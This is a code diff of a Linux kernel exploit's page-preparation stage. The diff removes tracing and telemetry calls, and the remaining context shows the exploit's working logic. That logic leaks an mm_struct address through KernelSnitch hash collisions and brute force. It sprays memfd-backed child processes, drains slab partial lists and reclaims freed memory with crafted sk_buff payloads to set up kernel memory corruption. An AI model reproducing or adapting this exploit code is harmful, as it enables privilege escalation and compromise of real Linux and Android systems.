@@ -295,16 +295,7 @@ int data_alias_uses_slide = 1;
 int data_addr_canonical;
 char ashmem_path[256] = "/dev/ashmem";
 
-__attribute__((weak)) void app_publish_writer_armed(void) {
-}
-__attribute__((weak)) void app_publish_writer_entered(void) {
-}
-__attribute__((weak)) void app_publish_writer_returned(int child_status) {
-  (void)child_status;
-}
-__attribute__((weak)) void app_publish_writer_possible_mutation(void) {
-}
-__attribute__((weak)) void app_publish_writer_verified_success(void) {
+__attribute__((weak)) void app_publish_writer_started(void) {
 }
 
 __attribute__((weak)) void app_publish_slide_ready(void) {
@@ -2063,7 +2054,6 @@ uintptr_t prepare_kernel_page(int payload_mode) {
     APP_CONTROLLED_MM_GROUP_RECLAIM
   return prepare_controlled_kernel_page(payload_mode);
 #else
-  czg3_prep_phase_begin("context_storage_init");
   close_reclaim_sockets();
 #if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
   cleanup_page_prepare_state();
@@ -2076,31 +2066,22 @@ uintptr_t prepare_kernel_page(int payload_mode) {
 
   skb_buf = malloc(SKB_SEND_SIZE);
   memset(skb_buf, 0x41, SKB_SEND_SIZE);
-  czg3_prep_phase_end("context_storage_init", "ok", prepare_ctx.mm_cnt,
-                      spray_ctx.mm_cnt);
 
-  czg3_prep_phase_begin("initial_prep_allocations");
   for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
     prepare_ctx.childs[i] = clone_child();
   }
   for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
     prepare_ctx.memfds[i] = open_memfd(prepare_ctx.childs[i]);
   }
-  czg3_prep_phase_end("initial_prep_allocations", "ok",
-                      prepare_ctx.mm_cnt, prepare_ctx.mm_cnt);
 
-  czg3_prep_phase_begin("spray_allocations");
   for (size_t i = 0; i < spray_ctx.mm_cnt; i++) {
     spray_ctx.childs[i] = clone_child();
     spray_ctx.memfds[i] = open_memfd(spray_ctx.childs[i]);
   }
-  czg3_prep_phase_end("spray_allocations", "ok", spray_ctx.mm_cnt,
-                      spray_ctx.mm_cnt);
 #if defined(APP_CLOSED_SLABINFO_TOUCH) && APP_CLOSED_SLABINFO_TOUCH
   touch_mm_slabinfo();
 #endif
 
-  czg3_prep_phase_begin("kernelsnitch_setup");
   int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
 #if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
   ks = kernelsnitch_setup(
@@ -2135,24 +2116,15 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   }
 #endif
 #endif
-  czg3_prep_phase_end("kernelsnitch_setup", "ok", cpu_count,
-                      KSNITCH_COLLISIONS);
 
-  czg3_prep_phase_begin("pre_allocations");
   for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
     pre_ctx.childs[i] = clone_child();
   }
-  czg3_prep_phase_end("pre_allocations", "ok", pre_ctx.mm_cnt, 0);
-  czg3_prep_phase_begin("leak_child_creation");
   child_leak = clone_leak_child();
-  czg3_prep_phase_end("leak_child_creation", "ok", child_leak, 0);
-  czg3_prep_phase_begin("post_allocations");
   for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
     post_ctx.childs[i] = clone_child();
   }
-  czg3_prep_phase_end("post_allocations", "ok", post_ctx.mm_cnt, 0);
 
-  czg3_prep_phase_begin("leak_memfd_open");
   for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
     pre_ctx.memfds[i] = open_memfd(pre_ctx.childs[i]);
   }
@@ -2160,13 +2132,10 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
     post_ctx.memfds[i] = open_memfd(post_ctx.childs[i]);
   }
-  czg3_prep_phase_end("leak_memfd_open", "ok",
-                      pre_ctx.mm_cnt + post_ctx.mm_cnt + 1, 0);
 #if defined(APP_CLOSED_SLABINFO_TOUCH) && APP_CLOSED_SLABINFO_TOUCH
   touch_mm_slabinfo();
 #endif
 
-  czg3_prep_phase_begin("free_pre_post_spray_children");
   for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
     kill_child(pre_ctx.childs[i]);
     pre_ctx.childs[i] = -1;
@@ -2179,11 +2148,7 @@ uintptr_t prepare_kernel_page(int payload_mode) {
     kill_child(spray_ctx.childs[i]);
     spray_ctx.childs[i] = -1;
   }
-  czg3_prep_phase_end("free_pre_post_spray_children", "ok",
-                      pre_ctx.mm_cnt + post_ctx.mm_cnt + spray_ctx.mm_cnt, 0);
-  czg3_prep_phase_begin("wait_leak_child");
   SYSCHK(waitpid(child_leak, NULL, 0));
-  czg3_prep_phase_end("wait_leak_child", "ok", child_leak, 0);
 #if defined(APP_CLOSED_SLABINFO_TOUCH) && APP_CLOSED_SLABINFO_TOUCH
   touch_mm_slabinfo();
 #endif
@@ -2191,14 +2156,7 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   log_mm_slabinfo("after-child-exit");
 #endif
 
-  czg3_prep_phase_begin("collision_ready");
-  int collisions_ready = kernelsnitch_found_collisions(ks);
-  czg3_prep_phase_end("collision_ready",
-                      collisions_ready ? "ok" : "collision_not_ready",
-                      collisions_ready, 0);
-  czg3_prep_checkpoint(collisions_ready ? "collision_ready" :
-                                           "collision_failed");
-  if (!collisions_ready) {
+  if (!kernelsnitch_found_collisions(ks)) {
     pr_warning("KernelSnitch collision finding failed\n");
 #if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
     cleanup_failed_kernel_page("collision");
@@ -2210,14 +2168,10 @@ uintptr_t prepare_kernel_page(int payload_mode) {
     }
     cleanup_page_prepare_state();
 #endif
-    czg3_prep_finish("collision_not_ready", 0, 0, 0);
     return 0;
   }
 
-  czg3_prep_phase_begin("kernelsnitch_bruteforce");
   kernelsnitch_bruteforce(ks);
-  czg3_prep_phase_end("kernelsnitch_bruteforce", "ok", 0, 0);
-  czg3_prep_checkpoint("bruteforce_complete");
   uintptr_t leaked = ks->mm_struct;
   if (leaked == (uintptr_t)-1) {
     pr_warning("KernelSnitch mm_struct leak failed\n");
@@ -2231,7 +2185,6 @@ uintptr_t prepare_kernel_page(int payload_mode) {
     }
     cleanup_page_prepare_state();
 #endif
-    czg3_prep_finish("leak_failed", leaked, 0, 0);
     return 0;
   }
 #if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
@@ -2240,8 +2193,8 @@ uintptr_t prepare_kernel_page(int payload_mode) {
 #endif
 
   uintptr_t base = leaked & ~(ORDER3_SIZE - 1);
-  size_t object_index = (leaked - base) / MM_STRUCT_SZ;
 #if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
+  size_t object_index = (leaked - base) / MM_STRUCT_SZ;
   pr_info("mm leaked=%016zx base=%016zx object_index=%zu\n",
           leaked, base, object_index);
 #if defined(APP_PAYLOAD) && APP_PAYLOAD && \
@@ -2256,8 +2209,7 @@ uintptr_t prepare_kernel_page(int payload_mode) {
       kill_child(prepare_ctx.childs[i]);
     }
     cleanup_page_prepare_state();
-      czg3_prep_finish("base_rejected", leaked, base, object_index);
-      return 0;
+    return 0;
   }
 #endif
 #if defined(APP_PAYLOAD) && APP_PAYLOAD && \
@@ -2272,7 +2224,6 @@ uintptr_t prepare_kernel_page(int payload_mode) {
       kill_child(prepare_ctx.childs[i]);
     }
     cleanup_page_prepare_state();
-    czg3_prep_finish("slide_index_low", leaked, base, object_index);
     return 0;
   }
 #endif
@@ -2288,7 +2239,6 @@ uintptr_t prepare_kernel_page(int payload_mode) {
       kill_child(prepare_ctx.childs[i]);
     }
     cleanup_page_prepare_state();
-    czg3_prep_finish("slide_index_high", leaked, base, object_index);
     return 0;
   }
 #endif
@@ -2304,7 +2254,6 @@ uintptr_t prepare_kernel_page(int payload_mode) {
       kill_child(prepare_ctx.childs[i]);
     }
     cleanup_page_prepare_state();
-    czg3_prep_finish("fops_index_low", leaked, base, object_index);
     return 0;
   }
 #endif
@@ -2318,10 +2267,7 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   slide_bank_configured =
       configure_slide_bank_geometry(leaked, payload_mode);
 #endif
-  czg3_prep_phase_begin("socket_skb_preparation");
-  int skb_payload_ready =
-      slide_bank_configured && prepare_skb_payload(base, payload_mode);
-  if (!skb_payload_ready) {
+  if (!slide_bank_configured || !prepare_skb_payload(base, payload_mode)) {
 #if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
     cleanup_failed_kernel_page("skb-payload");
 #else
@@ -2332,8 +2278,6 @@ uintptr_t prepare_kernel_page(int payload_mode) {
     }
     cleanup_page_prepare_state();
 #endif
-    czg3_prep_phase_end("socket_skb_preparation", "failed", 0, 0);
-    czg3_prep_finish("skb_payload_failed", leaked, base, object_index);
     return 0;
   }
 
@@ -2382,7 +2326,6 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   msg.msg_iovlen = 1;
 
   SYSCHK(sendmsg(pcp_shaping_sv[0], &msg, 0));
-  czg3_prep_phase_end("socket_skb_preparation", "ok", SKB_SEND_SIZE, 1);
 #if defined(APP_CLOSED_SLABINFO_TOUCH) && APP_CLOSED_SLABINFO_TOUCH
   touch_mm_slabinfo();
 #endif
@@ -2396,7 +2339,6 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   SYSCHK(fflush(NULL));
 #endif
 
-  czg3_prep_phase_begin("cpu_pin_yield_partial_free");
   pin_to_core(CORE);
   sched_yield();
   sched_yield();
@@ -2460,8 +2402,6 @@ uintptr_t prepare_kernel_page(int payload_mode) {
 #endif
   SYSCHK(close(memfd_leak));
   memfd_leak = -1;
-  czg3_prep_phase_end("cpu_pin_yield_partial_free", "ok",
-                      early_drain_triggers, 0);
 #if defined(APP_CLOSED_SLABINFO_TOUCH) && APP_CLOSED_SLABINFO_TOUCH
   touch_mm_slabinfo();
 #endif
@@ -2476,7 +2416,6 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   size_t deferred_reap_count = 0;
   memset(deferred_reap_children, 0, sizeof(deferred_reap_children));
 #endif
-  czg3_prep_phase_begin("late_cpu_partial_drain");
   for (size_t i = 0; i < drain_triggers; i++) {
     size_t index = (drain_start + i) * mm_objs_per_slab;
     SYSCHK(close(prepare_ctx.memfds[index]));
@@ -2518,7 +2457,6 @@ uintptr_t prepare_kernel_page(int payload_mode) {
     kill_child(prepare_ctx.childs[index]);
     prepare_ctx.childs[index] = -1;
   }
-  czg3_prep_phase_end("late_cpu_partial_drain", "ok", drain_triggers, 0);
 #if defined(APP_CLOSED_SLABINFO_TOUCH) && APP_CLOSED_SLABINFO_TOUCH
   touch_mm_slabinfo();
 #endif
@@ -2532,7 +2470,6 @@ uintptr_t prepare_kernel_page(int payload_mode) {
 #if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
   int reclaim_errno = 0;
 #endif
-  czg3_prep_phase_begin("sk_buff_reclaim");
   for (int i = 0; i < reclaim_sends; i++) {
     errno = 0;
     ssize_t sent = sendmsg(reclaim_sv[0], &msg, MSG_DONTWAIT);
@@ -2544,10 +2481,6 @@ uintptr_t prepare_kernel_page(int payload_mode) {
     }
     reclaim_sent++;
   }
-  czg3_prep_phase_end("sk_buff_reclaim",
-                      reclaim_sent ? "ok" : "failed", reclaim_sends,
-                      reclaim_sent);
-  czg3_prep_checkpoint("reclaim_complete");
 #if defined(APP_CLOSED_SLABINFO_TOUCH) && APP_CLOSED_SLABINFO_TOUCH
   touch_mm_slabinfo();
 #endif
@@ -2573,10 +2506,8 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   pr_info("kernel page cleanup stage=kernelsnitch begin mode=%d base=%016zx\n",
           payload_mode, base);
 #endif
-  czg3_prep_phase_begin("kernelsnitch_cleanup");
   kernelsnitch_cleanup(ks);
   ks = NULL;
-  czg3_prep_phase_end("kernelsnitch_cleanup", "ok", leaked, base);
 #if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
   pr_info("kernel page cleanup stage=kernelsnitch done mode=%d\n",
           payload_mode);
@@ -2584,7 +2515,6 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   pr_info("kernel page cleanup stage=prepare-children begin count=%zu\n",
           prepare_ctx.mm_cnt);
 #endif
-  czg3_prep_phase_begin("cleanup");
   for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
     if (prepare_ctx.memfds[i] >= 0) {
       SYSCHK(close(prepare_ctx.memfds[i]));
@@ -2602,14 +2532,11 @@ uintptr_t prepare_kernel_page(int payload_mode) {
     }
 #endif
   }
-  czg3_prep_phase_end("cleanup", "ok", prepare_ctx.mm_cnt, 0);
 #if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
   pr_info("kernel page cleanup stage=prepare-children done base=%016zx\n",
           base);
 #endif
 
-  czg3_prep_checkpoint("preparation_complete");
-  czg3_prep_finish("ok", leaked, base, object_index);
   return base;
 #endif
 }
@@ -2622,12 +2549,6 @@ uintptr_t prepare_good_kernel_page(int payload_mode) {
     max_attempts = FOPS_KERNEL_PAGE_SETUP_ATTEMPTS;
   }
   for (int attempt = 1; attempt <= max_attempts; attempt++) {
-    const char *supervisor_attempt = getenv("S23_SUPERVISOR_ATTEMPT");
-    int run_attempt = supervisor_attempt ? atoi(supervisor_attempt) : attempt;
-    czg3_prep_begin(payload_mode == PAGE_PAYLOAD_SLIDE ? "p0" : "fops",
-                    run_attempt > 0 ? run_attempt : attempt);
-    czg3_prep_phase_begin("preparation_context");
-    czg3_prep_phase_end("preparation_context", "ok", attempt, payload_mode);
     size_t started_ns = gettime_ns();
     uintptr_t base = prepare_kernel_page(payload_mode);
     size_t elapsed_ms = (gettime_ns() - started_ns) / 1000000ULL;
